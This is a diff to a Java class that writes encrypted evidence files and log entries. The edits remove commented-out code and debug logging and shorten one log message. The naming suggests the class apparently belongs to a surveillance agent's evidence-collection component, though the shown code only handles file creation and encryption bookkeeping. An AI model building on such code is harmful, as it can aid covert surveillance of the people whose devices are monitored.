@@ -285,12 +285,7 @@ public final class Evidence {
 		final Name name = evidenceCollector.makeNewName(this,
 				evidenceType.getMemo());
 
-
 		progressive = name.progressive;
-		//final String basePath = name.basePath;
-		//final String blockDir = name.blockDir;
-		//final String encName = name.encName;
-		//final String plainFileName = name.PlainFileName;
 
 		final String dir = name.basePath + name.blockDir + "/";
 		final boolean ret = Path.createDirectory(dir);
@@ -305,7 +300,6 @@ public final class Evidence {
 		Check.asserts(!fileName.endsWith(EvidenceCollector.LOG_TMP),
 				"file not scrambled");
 		// Check.asserts(!fileName.endsWith("MOB"), "file not scrambled");
-		Log.d("QZ", TAG + " createLog fileName:" + fileName);
 		try {
 			fconn = new AutoFile(fileName);
 
@@ -314,7 +308,7 @@ public final class Evidence {
 				Log.d("QZ", TAG + " FATAL: It should not exist:" + fileName);
 				return false;
 			}
-			Log.d("QZ", TAG + " Info: Created: " + fileName + " plain: " + name.fileName);
+			Log.d("QZ", TAG + " Created " + evidenceType + " : " + name.fileName);
 			final byte[] plainBuffer = makeDescription(additionalData,
 					evidenceType);
 			Check.asserts(plainBuffer.length >= 32 + additionalLen,
@@ -471,8 +465,7 @@ public final class Evidence {
 			Log.d("QZ", TAG + " Error: fconn null");
 			return false;
 		}
-		Log.d("QZ", TAG + " Info: writeEvidence encdata: " + encData.length);
-		Log.d("QZ", TAG + " Info: fileSize: " + fconn.getSize());
+		
 		try {
 			fconn.append(Utils.intToByteArray(data.length - offset));
 			fconn.append(encData);
@@ -507,7 +500,6 @@ public final class Evidence {
 			final byte[] token = (byte[]) bytelist.elementAt(i);
 			databuffer.write(token);
 		}
-		Log.d("QZ", TAG + " len: " + buffer.length);
 		return writeEvidence(buffer);
 	}
 
@@ -532,8 +524,6 @@ public final class Evidence {
 			new LogR(EvidenceType.INFO, LogR.LOG_PRI_STD, null, WChar.getBytes(
 					message, true));
 
-			// final Evidence logInfo = new Evidence(Agent.AGENT_INFO);
-			// logInfo.atomicWriteOnce(message);
 
 		} catch (final Exception ex) {
 			Log.d("QZ", TAG + " Error: " +ex.toString());
